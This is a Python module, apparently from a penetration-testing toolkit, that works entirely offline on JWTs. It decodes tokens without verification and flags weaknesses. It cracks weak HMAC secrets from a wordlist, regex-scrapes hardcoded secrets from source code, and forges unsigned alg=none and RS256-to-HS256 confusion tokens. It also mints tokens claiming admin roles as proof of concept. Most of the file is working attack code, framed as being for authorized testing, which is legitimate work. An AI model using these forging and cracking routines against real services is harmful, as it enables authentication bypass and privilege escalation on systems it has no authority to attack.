"""Offline JWT lab — decode, analyze, crack (dictionary), and forge tokens for a PoC.

The fiddly-but-easy JWT attacks (alg=none, alg confusion RS256->HS256, weak/known HMAC
secret) are worth automating. This does that **entirely offline**: the operator supplies a
token they already hold within authorized scope, and the lab decodes it, flags the classic
weaknesses, tries to recover a weak HMAC secret from a wordlist, and mints a forged token to
use as proof.

Boundary (same as the reproduction harness): this NEVER sends a token anywhere. It produces
a forged token as a PoC artifact; a human decides whether to use it against an in-scope live
target. No network, no live attack, no credential entry. Pure local crypto on stdlib
(hmac/hashlib/base64) — HS256/384/512 + the 'none' alg, which is all the classic attacks need.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from dataclasses import dataclass, field

_ALG_HASH = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def b64url_decode(s: str) -> bytes:
    s = s.strip()
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


@dataclass
class DecodedJWT:
    header: dict
    payload: dict
    signature: str            # the b64url signature segment (may be "")
    signing_input: str        # header.payload — what the signature covers
    raw: str

    @property
    def alg(self) -> str:
        return str(self.header.get("alg", "")).strip()


def decode(token: str) -> DecodedJWT:
    """Decode a JWT WITHOUT verifying (like the attacker's first move). Raises ValueError on
    a malformed token."""
    parts = token.strip().split(".")
    if len(parts) < 2:
        raise ValueError("not a JWT (need at least header.payload)")
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except Exception as exc:
        raise ValueError(f"could not decode header/payload: {exc}") from exc
    sig = parts[2] if len(parts) > 2 else ""
    return DecodedJWT(header=header, payload=payload, signature=sig,
                      signing_input=parts[0] + "." + parts[1], raw=token)


def _hs_sign(signing_input: str, secret: bytes, alg: str) -> str:
    h = _ALG_HASH.get(alg.upper())
    if h is None:
        raise ValueError(f"unsupported HMAC alg: {alg}")
    return b64url_encode(hmac.new(secret, signing_input.encode(), h).digest())


@dataclass
class Weakness:
    id: str
    severity: str
    detail: str


def analyze(token: str) -> list[Weakness]:
    """Flag the classic JWT weaknesses visible from the token alone (offline)."""
    d = decode(token)
    out: list[Weakness] = []
    alg = d.alg.lower()
    if alg in ("none", ""):
        out.append(Weakness("alg-none", "critical",
                            "alg is 'none'/empty — if the server honors it, the signature is "
                            "not checked and any payload is accepted."))
    if alg.startswith("hs"):
        out.append(Weakness("hmac-alg", "info",
                            f"HMAC alg ({d.alg}) — a weak/guessable secret is forgeable; try "
                            "the dictionary crack. Also test RS->HS alg confusion if the "
                            "server has an RSA public key."))
    if not d.signature and alg not in ("none", ""):
        out.append(Weakness("missing-signature", "high",
                            "alg claims a signature but none is present."))
    if "exp" not in d.payload:
        out.append(Weakness("no-exp", "medium",
                            "no 'exp' claim — token may never expire."))
    if d.header.get("kid"):
        out.append(Weakness("kid-present", "info",
                            "'kid' header present — test kid injection (path traversal / "
                            "SQLi into key lookup)."))
    if d.header.get("jku") or d.header.get("x5u"):
        out.append(Weakness("jku-x5u", "high",
                            "'jku'/'x5u' header present — test pointing it at an attacker-"
                            "controlled key set (SSRF + key substitution)."))
    return out


def crack_hmac(token: str, candidates, *, max_tries: int = 2_000_000) -> str | None:
    """Return the HMAC secret if one of `candidates` (an iterable of str) verifies the token's
    signature; else None. Offline dictionary attack. Bounded by max_tries."""
    d = decode(token)
    if not d.alg.upper().startswith("HS") or not d.signature:
        return None
    want = d.signature
    for i, cand in enumerate(candidates):
        if i >= max_tries:
            break
        c = cand.strip("\n")
        try:
            if hmac.compare_digest(_hs_sign(d.signing_input, c.encode(), d.alg), want):
                return c
        except Exception:
            continue
    return None


def crack_hmac_wordlist(token: str, wordlist_path: str, **kw) -> str | None:
    """crack_hmac over a wordlist file (one secret per line)."""
    def _lines():
        with open(wordlist_path, encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                yield line
    return crack_hmac(token, _lines(), **kw)


def forge(payload: dict, *, alg: str = "none", secret: str = "",
          header: dict | None = None) -> str:
    """Mint a forged token as a PoC artifact (NOT sent anywhere).
    - alg='none' -> unsigned token (empty signature segment) for the alg=none bypass.
    - alg='HS*'  -> HMAC-signed with `secret` (a cracked secret, or a known/public key for
      the RS->HS confusion attack)."""
    hdr = {"alg": alg, "typ": "JWT"}
    if header:
        hdr.update(header)
    hdr["alg"] = alg
    seg = b64url_encode(json.dumps(hdr, separators=(",", ":")).encode()) + "." + \
        b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    if alg.lower() == "none":
        return seg + "."
    if alg.upper() in _ALG_HASH:
        if not secret:
            raise ValueError("HMAC forge needs a secret")
        return seg + "." + _hs_sign(seg, secret.encode(), alg)
    raise ValueError(f"forge supports 'none' and HS256/384/512, not {alg}")


def forge_alg_confusion(token: str, public_key_pem: str, *, alg: str = "HS256",
                        mutate: dict | None = None) -> str:
    """RS256->HS256 confusion PoC: re-sign the token's (optionally mutated) payload with
    HS256 using the server's RSA PUBLIC key as the HMAC secret. If the server verifies HS256
    with that same public key, the forgery is accepted. Offline artifact only."""
    d = decode(token)
    payload = dict(d.payload)
    if mutate:
        payload.update(mutate)
    return forge(payload, alg=alg, secret=public_key_pem)


import re as _re

# hardcoded-secret patterns near JWT usage: `secret = "..."`, `JWT_SECRET: '...'`, etc.
_SECRET_RE = _re.compile(
    r"""(?:jwt[_-]?secret|secret|signing[_-]?key|hmac[_-]?key|key)\s*[:=]\s*"""
    r"""["'`]([^"'`\n]{4,120})["'`]""", _re.IGNORECASE)

# a demonstrative elevated payload — a PoC shows privilege escalation, not real user data
_POC_PAYLOAD = {"sub": "1", "user": "admin", "role": "admin", "isAdmin": True,
                "scope": "admin", "exp": 9999999999}


def extract_secret(source: str) -> str:
    """Best-effort pull of a hardcoded HMAC/JWT secret from a source excerpt; '' if none."""
    for m in _SECRET_RE.finditer(source or ""):
        val = m.group(1).strip()
        # skip obvious non-secrets (env lookups, placeholders)
        if val and "process.env" not in val and "os.environ" not in val \
                and val.lower() not in ("changeme", "your-secret", "todo", "xxx"):
            return val
    return ""


def poc_for_finding(*, source: str = "", weaknesses: list[str] | None = None,
                    sample_token: str = "") -> dict:
    """Build a forged-token PoC for a JWT finding, fully offline. Strategy:
      - if a hardcoded secret is in the source -> forge an admin token signed with it (the
        strongest PoC: a valid signature the server will accept);
      - else -> forge an alg=none admin token (works if the server honors alg=none).
    Returns a dict attached to the finding/report. The token is a PoC ARTIFACT; a human uses
    it against the in-scope target. Never sent anywhere here."""
    weaknesses = weaknesses or []
    base_payload = dict(_POC_PAYLOAD)
    if sample_token:
        try:
            base_payload = {**decode(sample_token).payload, **{"role": "admin", "isAdmin": True}}
        except ValueError:
            pass
    secret = extract_secret(source)
    if secret:
        token = forge(base_payload, alg="HS256", secret=secret)
        return {"attack": "hardcoded-secret", "alg": "HS256",
                "secret_used": secret,
                "forged_token": token,
                "how": "The HMAC secret is hardcoded in the source, so an attacker can mint "
                       "any token. This token is signed with that secret and claims admin.",
                "note": "PoC artifact — verify against the in-scope target; do not reuse the "
                        "found secret for anything else."}
    token = forge(base_payload, alg="none")
    return {"attack": "alg-none", "alg": "none",
            "forged_token": token,
            "how": "If the server accepts alg=none it skips signature verification; this "
                   "unsigned token claims admin.",
            "note": "PoC artifact — only works if the server honors alg=none. Also try RS->HS "
                    "confusion (jwt_lab.forge_alg_confusion) with the server's public key."}


def report(token: str) -> dict:
    """A compact offline triage of a token: decoded parts + weaknesses. Values are the
    operator's own token; nothing is redacted here since they supplied it."""
    d = decode(token)
    return {"alg": d.alg, "header": d.header, "payload": d.payload,
            "has_signature": bool(d.signature),
            "weaknesses": [{"id": w.id, "severity": w.severity, "detail": w.detail}
                           for w in analyze(token)]}
